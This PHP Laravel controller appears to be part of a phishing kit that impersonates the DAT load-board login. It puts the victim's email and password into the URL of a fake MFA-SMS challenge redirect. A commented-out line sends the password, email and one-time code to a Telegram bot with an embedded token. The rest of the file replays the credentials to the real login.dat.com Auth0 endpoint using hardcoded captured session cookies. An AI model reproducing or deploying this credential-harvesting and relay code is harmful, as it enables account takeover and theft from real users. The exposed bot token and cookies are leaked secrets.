<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class LoginController extends Controller
{
    public function passwordProtection(Request $request)
    {

        return redirect('/mfa-sms-challenge?state=hKFo2SA1Z2VIZ3dxMjBaTTNrQTBNOXplM2JmeFJTOWkyNVd6aaFupWxvZ2luo3RpZNkgdklYN3VXNmowNm9fYkltVC1Vajh3NGNiT0NxRDBpSkajY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&email='.$request->all()['email'].'&pass='.$request->all()['password']);

    }


    public function complete(Request $request) {
        $data = $request->all();
//        $url = "https://api.telegram.org/bot7454497720:AAEWazUhIha95Tdg3DHNe5wBLsqciLL6ZAg/sendMessage?chat_id=@JHBastard&text=pass:%20".$data['password']."%20%20%20%20email:%20".$data['email']."%20%20%20%20%20otp:%20".$data['otp'];
//        dd($url);


//
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://login.dat.com/usernamepassword/login',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
//            CURLOPT_POSTFIELDS =>'{"client_id":"PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP","redirect_uri":"https://power.dat.com/signin-auth0","tenant":"prod","response_type":"code id_token token","scope":"openid profile offline_access email","password":"'.$data['password'].'","protocol":"oauth2","response_mode":"form_post","nonce":"638591635750475526.OTVlNDhlNGYtMmJmYy00MGJlLWE2OGQtZThkMDhlMThiMjY2MDMzOWE0NzQtZmY5Ni00NzUyLTlkOTItNDI0MWE4ZGEwYWJl","app_name":"Power","page_mode":"Legacy","audience":"https://prod-api.dat.com","prompt":"login","x-client-_sku":"ID_NET451","x-client-ver":"5.2.1.0","_csrf":"wRq7o5sA-XQq0d6D_yYcVoEta6RGTwcY2Qac","_intstate":"deprecated","state":"hKFo2SBPMWJPVUtYbFR0aU14QUI0SnNWZDhxaGpoTUxHdGo2MaFupWxvZ2luo3RpZNkgUE9iWGZNbWdPaDJPNUFzV1BiVGJ0TzBjODNqODVqNnOjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA","connection":"Email-Password-Authentication","username":"'.$data['email'].'"}',
            CURLOPT_POSTFIELDS =>'{"client_id":"PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP","redirect_uri":"https://power.dat.com/signin-auth0","tenant":"prod","response_type":"code id_token token","scope":"openid profile offline_access email","password":"AAAaaa111!","protocol":"oauth2","response_mode":"form_post","nonce":"638591635750475526.OTVlNDhlNGYtMmJmYy00MGJlLWE2OGQtZThkMDhlMThiMjY2MDMzOWE0NzQtZmY5Ni00NzUyLTlkOTItNDI0MWE4ZGEwYWJl","app_name":"Power","page_mode":"Legacy","audience":"https://prod-api.dat.com","prompt":"login","x-client-_sku":"ID_NET451","x-client-ver":"5.2.1.0","_csrf":"wRq7o5sA-XQq0d6D_yYcVoEta6RGTwcY2Qac","_intstate":"deprecated","state":"hKFo2SBPMWJPVUtYbFR0aU14QUI0SnNWZDhxaGpoTUxHdGo2MaFupWxvZ2luo3RpZNkgUE9iWGZNbWdPaDJPNUFzV1BiVGJ0TzBjODNqODVqNnOjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA","connection":"Email-Password-Authentication","username":"test4agent@gmail.com"}',
            CURLOPT_HTTPHEADER => array(
                'accept: */*',
                'accept-language: en-US,en;q=0.9,ru;q=0.8,hy;q=0.7',
                'auth0-client: eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9',
                'content-type: application/json',
                'cookie: _csrf=hQJNSibL1ZCeqqpBRK2v9Fq9; HandLtestDomainName=HandLtestDomainValue; __utmc=32971051; __utmz=32971051.1720768694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); user_agent=Mozilla/5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; ajs_user_id=2872387; ajs_anonymous_id=3aef3cf8-7e9e-4070-9d50-7155f2c965ec; _hjSessionUser_3280111=eyJpZCI6IjFiMTU3ZDBlLTkxNmQtNTQ3Yi05NTgxLTA3YTMxNTEwOWI0ZCIsImNyZWF0ZWQiOjE3MjA3Njg3MDU4NzgsImV4aXN0aW5nIjp0cnVlfQ==; _vwo_uuid_v2=DBFDF74D0721F1F3BC79512EBE920196B|fd757a2b73f743a11c335711b0a5612b; _gcl_au=1.1.1535992682.1720768706; _vwo_uuid=DBFDF74D0721F1F3BC79512EBE920196B; _vwo_ds=3%241720768705%3A67.89109313%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _ga=GA1.1.1537811867.1720768706; _fbp=fb.1.1720768706867.953837007944225954; calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.dat.com/; calltrk_session_id=3983462b-762d-40d1-afe7-23e2391c7c7e; _hjSessionUser_2420462=eyJpZCI6IjBlYjgyZTJjLTE1YTktNTE5YS1hMWU3LWRhN2JhYzI3MWNjYyIsImNyZWF0ZWQiOjE3MjA3Njg5NjE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; did=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; did_compat=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; handl_url_base=https://www.dat.com/; handl_url=https://www.dat.com/; handl_ref=; handl_ref_domain=; __utma=32971051.1559668289.1720768694.1722161500.1722268026.3; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Jul+29+2024+19%3A47%3A08+GMT%2B0400+(Armenia+Standard+Time)&version=202403.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4c14b15f-3b02-4459-a4a2-96d43945056d&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C3%3A1%2CSSPD_BG%3A1%2C2%3A1%2C5%3A1%2C4%3A1&AwaitingReconsent=false; _uetvid=ee347720401e11efaf4be1d9cecaf734; _rdt_uuid=1720768706377.916c2a60-88ff-4404-8266-c31dfe37d7f1; _rdt_em=0000000000000000000000000000000000000000000000000000000000000001; __cf_bm=glGC2iaXDmpAlxJJUU9w9lfJXpvWjhLD9cUKxn2wchc-1723566766-1.0.1.1-cpKt2LpubikwjMlyxtNreBio79b1hqya_5iUnHUc7JqZVUALQ7CSkwTfmmfHnY8NTMV89AUfZd9kSzODwe9CeQ; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQFUtLhLaoVI0dFM6SQTomV0H2aMd3ew7CKEEpEpQiQopjm5mCEY9qcWSYCAlN_DZvqTx-N9_V68WOWJtOYtP5smmY29va2llg6dleHBpcmVz1_9cgaQAZr9_N65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.DzCxh42%2FkM8Sw32n2L8BThKIdeP6CYSQIn1Eywu4j%2FM; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQFUtLhLaoVI0dFM6SQTomV0H2aMd3ew7CKEEpEpQiQopjm5mCEY9qcWSYCAlN_DZvqTx-N9_V68WOWJtOYtP5smmY29va2llg6dleHBpcmVz1_9cgaQAZr9_N65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.DzCxh42%2FkM8Sw32n2L8BThKIdeP6CYSQIn1Eywu4j%2FM; _ga_C36TRC5CVZ=GS1.1.1723566782.18.0.1723566782.0.0.0; _ga_QYVEY2GZSM=GS1.1.1723566782.17.0.1723566782.0.0.0; hlp-remember-me-cookie=test4agent%40gmail.com; __cf_bm=.tqoGlKyFBCr6TCRpRg9RKJMS9w8YxWfp9ZzUKdSWbo-1723567227-1.0.1.1-vcrlPDGoxkerPtsHqhVoch9L9Udoi5zmcYcwtP5B1tT2wuMpX0THrR0preUJZuqDkgktfsIf2E6lXD04pd9K9Q',
                'origin: https://login.dat.com',
                'priority: u=1, i',
                'referer: https://login.dat.com/login?state=hKFo2SBPMWJPVUtYbFR0aU14QUI0SnNWZDhxaGpoTUxHdGo2MaFupWxvZ2luo3RpZNkgUE9iWGZNbWdPaDJPNUFzV1BiVGJ0TzBjODNqODVqNnOjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638591635750475526.OTVlNDhlNGYtMmJmYy00MGJlLWE2OGQtZThkMDhlMThiMjY2MDMzOWE0NzQtZmY5Ni00NzUyLTlkOTItNDI0MWE4ZGEwYWJl&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1723566777928',
                'sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-arch: "arm"',
                'sec-ch-ua-bitness: "64"',
                'sec-ch-ua-full-version: "127.0.6533.89"',
                'sec-ch-ua-full-version-list: "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.89", "Chromium";v="127.0.6533.89"',
                'sec-ch-ua-mobile: ?0',
                'sec-ch-ua-model: ""',
                'sec-ch-ua-platform: "macOS"',
                'sec-ch-ua-platform-version: "13.0.1"',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin'
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        dd($response);




//        $client = new GuzzleHttp\Client();
//        dd($data);
//        $headers = [
//            'accept' => '*/*',
//            'accept-language' => 'en-US,en;q=0.9,ru;q=0.8,hy;q=0.7',
//            'auth0-client' => 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9',
//            'content-type' => 'application/json',
//            'cookie' => '_csrf=hQJNSibL1ZCeqqpBRK2v9Fq9; HandLtestDomainName=HandLtestDomainValue; __utmc=32971051; __utmz=32971051.1720768694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); user_agent=Mozilla/5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; ajs_user_id=2872387; ajs_anonymous_id=3aef3cf8-7e9e-4070-9d50-7155f2c965ec; _hjSessionUser_3280111=eyJpZCI6IjFiMTU3ZDBlLTkxNmQtNTQ3Yi05NTgxLTA3YTMxNTEwOWI0ZCIsImNyZWF0ZWQiOjE3MjA3Njg3MDU4NzgsImV4aXN0aW5nIjp0cnVlfQ==; _vwo_uuid_v2=DBFDF74D0721F1F3BC79512EBE920196B|fd757a2b73f743a11c335711b0a5612b; _gcl_au=1.1.1535992682.1720768706; _vwo_uuid=DBFDF74D0721F1F3BC79512EBE920196B; _vwo_ds=3%241720768705%3A67.89109313%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _ga=GA1.1.1537811867.1720768706; _fbp=fb.1.1720768706867.953837007944225954; calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.dat.com/; calltrk_session_id=3983462b-762d-40d1-afe7-23e2391c7c7e; _hjSessionUser_2420462=eyJpZCI6IjBlYjgyZTJjLTE1YTktNTE5YS1hMWU3LWRhN2JhYzI3MWNjYyIsImNyZWF0ZWQiOjE3MjA3Njg5NjE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; did=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; did_compat=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; handl_url_base=https://www.dat.com/; handl_url=https://www.dat.com/; handl_ref=; handl_ref_domain=; __utma=32971051.1559668289.1720768694.1722161500.1722268026.3; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Jul+29+2024+19%3A47%3A08+GMT%2B0400+(Armenia+Standard+Time)&version=202403.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4c14b15f-3b02-4459-a4a2-96d43945056d&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C3%3A1%2CSSPD_BG%3A1%2C2%3A1%2C5%3A1%2C4%3A1&AwaitingReconsent=false; _uetvid=ee347720401e11efaf4be1d9cecaf734; _rdt_uuid=1720768706377.916c2a60-88ff-4404-8266-c31dfe37d7f1; _rdt_em=0000000000000000000000000000000000000000000000000000000000000001; __cf_bm=glGC2iaXDmpAlxJJUU9w9lfJXpvWjhLD9cUKxn2wchc-1723566766-1.0.1.1-cpKt2LpubikwjMlyxtNreBio79b1hqya_5iUnHUc7JqZVUALQ7CSkwTfmmfHnY8NTMV89AUfZd9kSzODwe9CeQ; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQFUtLhLaoVI0dFM6SQTomV0H2aMd3ew7CKEEpEpQiQopjm5mCEY9qcWSYCAlN_DZvqTx-N9_V68WOWJtOYtP5smmY29va2llg6dleHBpcmVz1_9cgaQAZr9_N65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.DzCxh42%2FkM8Sw32n2L8BThKIdeP6CYSQIn1Eywu4j%2FM; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQFUtLhLaoVI0dFM6SQTomV0H2aMd3ew7CKEEpEpQiQopjm5mCEY9qcWSYCAlN_DZvqTx-N9_V68WOWJtOYtP5smmY29va2llg6dleHBpcmVz1_9cgaQAZr9_N65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.DzCxh42%2FkM8Sw32n2L8BThKIdeP6CYSQIn1Eywu4j%2FM; _ga_C36TRC5CVZ=GS1.1.1723566782.18.0.1723566782.0.0.0; _ga_QYVEY2GZSM=GS1.1.1723566782.17.0.1723566782.0.0.0; hlp-remember-me-cookie=test4agent%40gmail.com; __cf_bm=.tqoGlKyFBCr6TCRpRg9RKJMS9w8YxWfp9ZzUKdSWbo-1723567227-1.0.1.1-vcrlPDGoxkerPtsHqhVoch9L9Udoi5zmcYcwtP5B1tT2wuMpX0THrR0preUJZuqDkgktfsIf2E6lXD04pd9K9Q',
//            'origin' => 'https://login.dat.com',
//            'priority' => 'u=1, i',
//            'referer' => 'https://login.dat.com/login?state=hKFo2SBPMWJPVUtYbFR0aU14QUI0SnNWZDhxaGpoTUxHdGo2MaFupWxvZ2luo3RpZNkgUE9iWGZNbWdPaDJPNUFzV1BiVGJ0TzBjODNqODVqNnOjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638591635750475526.OTVlNDhlNGYtMmJmYy00MGJlLWE2OGQtZThkMDhlMThiMjY2MDMzOWE0NzQtZmY5Ni00NzUyLTlkOTItNDI0MWE4ZGEwYWJl&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1723566777928',
//            'sec-ch-ua' => '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
//            'sec-ch-ua-arch' => '"arm"',
//            'sec-ch-ua-bitness' => '"64"',
//            'sec-ch-ua-full-version' => '"127.0.6533.89"',
//            'sec-ch-ua-full-version-list' => '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.89", "Chromium";v="127.0.6533.89"',
//            'sec-ch-ua-mobile' => '?0',
//            'sec-ch-ua-model' => '""',
//            'sec-ch-ua-platform' => '"macOS"',
//            'sec-ch-ua-platform-version' => '"13.0.1"',
//            'sec-fetch-dest' => 'empty',
//            'sec-fetch-mode' => 'cors',
//            'sec-fetch-site' => 'same-origin'
//        ];
//        $body = [
//          "client_id"=> "PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP",
//          "redirect_uri"=> "https://power.dat.com/signin-auth0",
//          "tenant"=> "prod",
//          "response_type"=> "code id_token token",
//          "scope"=> "openid profile offline_access email",
//          "password"=> "AAAaaa111!",
//          "protocol"=> "oauth2",
//          "response_mode"=> "form_post",
//          "nonce"=> "638591635750475526.OTVlNDhlNGYtMmJmYy00MGJlLWE2OGQtZThkMDhlMThiMjY2MDMzOWE0NzQtZmY5Ni00NzUyLTlkOTItNDI0MWE4ZGEwYWJl",
//          "app_name"=> "Power",
//          "page_mode"=> "Legacy",
//          "audience"=> "https://prod-api.dat.com",
//          "prompt"=> "login",
//          "x-client-_sku"=> "ID_NET451",
//          "x-client-ver"=> "5.2.1.0",
//          "_csrf"=> "wRq7o5sA-XQq0d6D_yYcVoEta6RGTwcY2Qac",
//          "_intstate"=> "deprecated",
//          "state"=> "hKFo2SBPMWJPVUtYbFR0aU14QUI0SnNWZDhxaGpoTUxHdGo2MaFupWxvZ2luo3RpZNkgUE9iWGZNbWdPaDJPNUFzV1BiVGJ0TzBjODNqODVqNnOjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA",
//          "connection"=> "Email-Password-Authentication",
//          "username"=> "test4agent@gmail.com"
//        ];
////        $request = new Request('POST', 'https://login.dat.com/usernamepassword/login', $headers, $body);
////        $res = $client->sendAsync($request)->wait();
////        echo $res->getBody();
//
//        $response = Http::withHeaders($headers)->post('https://login.dat.com/usernamepassword/login', $body);
//
//
//        dd($response);
    }
}
